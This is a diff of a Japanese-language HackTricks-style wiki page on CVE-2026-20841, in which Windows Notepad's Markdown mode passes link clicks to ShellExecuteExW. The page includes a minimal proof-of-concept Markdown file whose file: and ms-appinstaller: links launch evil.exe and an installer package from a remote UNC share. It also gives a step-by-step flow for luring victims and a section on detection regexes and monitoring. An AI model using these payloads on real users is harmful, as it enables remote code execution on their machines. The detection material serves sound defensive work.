@@ -2,46 +2,46 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-Markdown/HTML をレンダリングするモダンな Windows アプリケーションは、ユーザー提供のリンクをクリック可能な要素に変換して `ShellExecuteExW` に渡すことがよくあります。厳密なスキーム許可リストがないと、`file:` や `ms-appinstaller:` のような登録済みプロトコルハンドラがトリガーされ、現在のユーザーコンテキストでコード実行につながる可能性があります。
+ModernなWindowsアプリケーションでMarkdown/HTMLをrenderするものは、ユーザーが指定したlinkをclick可能な要素に変換し、`ShellExecuteExW`に渡すことがよくあります。schemeの厳密なallowlistがない場合、登録されている任意のprotocol handler（例: `file:`、`ms-appinstaller:`）をtriggerでき、現在のuser contextでのcode executionにつながる可能性があります。<sup>[[1]](#references)</sup>
 
-## ShellExecuteExW が Windows Notepad の Markdown モードで露出する箇所
-- Notepad は `sub_1400ED5D0()` の固定文字列比較を介して **`.md` 拡張子に対してのみ** Markdown モードを選択します。
-- サポートされる Markdown リンク:
-- 標準: `[text](target)`
-- Autolink: `<target>`（`[target](target)` としてレンダリングされる）ため、両方の構文がペイロードと検出に影響します。
-- リンクのクリックは `sub_140170F60()` で処理され、ここで弱いフィルタリングが行われた後に `ShellExecuteExW` が呼ばれます。
-- `ShellExecuteExW` は HTTP(S) のみならず、**設定された任意のプロトコルハンドラ** にディスパッチします。
+## Windows NotepadのMarkdown modeにおけるShellExecuteExW surface
+- Notepadは、`sub_1400ED5D0()`内の固定string比較により、**`.md` extensionの場合のみ**Markdown modeを選択します。<sup>[[1]](#references)</sup>
+- Supported Markdown links:
+- Standard: `[text](target)`
+- Autolink: `<target>`（`[target](target)`としてrenderされる）。そのため、payloadとdetectionの両方でこの2つのsyntaxが重要です。
+- linkのclickは`sub_140170F60()`で処理されます。このfunctionは弱いfilteringを行った後、`ShellExecuteExW`をcallします。
+- `ShellExecuteExW`はHTTP(S)だけでなく、**設定されている任意のprotocol handler**にdispatchします。<sup>[[1]](#references)</sup>
 
 ### Payload considerations
-- リンク内のすべての `\\` シーケンスは `ShellExecuteExW` に渡される前に **`\\` が `\` に正規化されます**。これは UNC/パスの作成や検出に影響します。
-- `.md` ファイルはデフォルトで Notepad に関連付けられていません; 被害者はファイルを Notepad で開いてリンクをクリックする必要がありますが、一旦レンダリングされるとリンクはクリック可能になります。
-- 危険なスキームの例:
-- `file://` を使ってローカル/UNC payload を起動する。
-- `ms-appinstaller://` は App Installer のフローをトリガーします。その他のローカル登録済みスキームも悪用可能な場合があります。
+- link内の任意の`\\` sequenceは、`ShellExecuteExW`の前に**`\`へnormalize**されるため、UNC/pathのcraftingおよびdetectionに影響します。
+- `.md` filesは**defaultではNotepadにassociatedされていません**。そのためvictimは引き続きfileをNotepadで開いてlinkをclickする必要がありますが、一度renderされるとlinkはclick可能になります。
+- Dangerous example schemes:<sup>[[1]](#references)</sup>
+- `file://`はlocal/UNC payloadをlaunchするために使用できます。
+- `ms-appinstaller://`はApp Installer flowをtriggerするために使用できます。その他のlocalにregisteredされたschemeもabuseできる可能性があります。
 
 ### Minimal PoC Markdown
 ```markdown
 [run](file://\\192.0.2.10\\share\\evil.exe)
 <ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
 ```
-### 悪用フロー
-1. Notepad が Markdown として表示するような **`.md` ファイル** を作成する。
-2. 危険な URI スキーム（`file:`, `ms-appinstaller:`, または任意のインストール済みハンドラ）を使ってリンクを埋め込む。
-3. ファイルを（HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB 等で）配布し、ユーザーに Notepad で開かせるよう誘導する。
-4. クリックすると、**正規化されたリンク** が `ShellExecuteExW` に渡され、対応するプロトコルハンドラが参照されたコンテンツをユーザーのコンテキストで実行する。
+### Exploitation flow
+1. Notepad が Markdown としてレンダリングするように **`.md` file** を作成する。
+2. 危険な URI scheme（`file:`、`ms-appinstaller:`、またはインストール済みの任意の handler）を使用して link を埋め込む。
+3. file を（HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB または類似の方法で）配布し、ユーザーを誘導して Notepad で開かせる。
+4. クリックすると、**normalized link** が `ShellExecuteExW` に渡され、対応する protocol handler がユーザーの context で参照された content を実行する。<sup>[[1]](#references)[[2]](#references)</sup>
 
-## 検出のアイデア
-- ドキュメント配布で一般的に使われるポート/プロトコル上での `.md` ファイル転送を監視する：`20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
-- Markdown のリンク（standard と autolink）を解析し、**大文字小文字を区別せずに** `file:` または `ms-appinstaller:` を探す。
-- ベンダー推奨の正規表現でリモートリソースアクセスを検出：
+## Detection ideas
+- 文書の配布に一般的に使用される port/protocol 経由での `.md` file の転送を監視する: `20/21 (FTP)`、`80 (HTTP)`、`443 (HTTPS)`、`110 (POP3)`、`143 (IMAP)`、`25/587 (SMTP)`、`139/445 (SMB/CIFS)`、`2049 (NFS)`、`111 (portmap)`。
+- Markdown link（standard および autolink）を解析し、**case-insensitive** な `file:` または `ms-appinstaller:` を探す。
+- remote resource access を検出するための、vendor-guided regexes:
 ```
 (\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
 (\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
 ```
-- パッチの挙動は報告によれば、**ローカルファイルと HTTP(S) を許可リストに登録**します。`ShellExecuteExW` に到達するその他のものは疑わしいです。攻撃対象はシステムごとに異なるため、必要に応じて検出を他のインストール済みプロトコルハンドラーにも拡張してください。
+- パッチ後の挙動では、**ローカルファイルと HTTP(S) を allowlist に登録している**と報告されています。それ以外で `ShellExecuteExW` に到達するものは suspicious です。攻撃対象領域は system によって異なるため、必要に応じて他のインストール済み protocol handler も検出対象に追加してください。<sup>[[1]](#references)</sup>
 
-## 参考資料
-- [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
-- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)
+## References
+- [1] [CVE-2026-20841: Windows Notepad における任意コード実行](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
+- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)
 
 {{#include ../banners/hacktricks-training.md}}
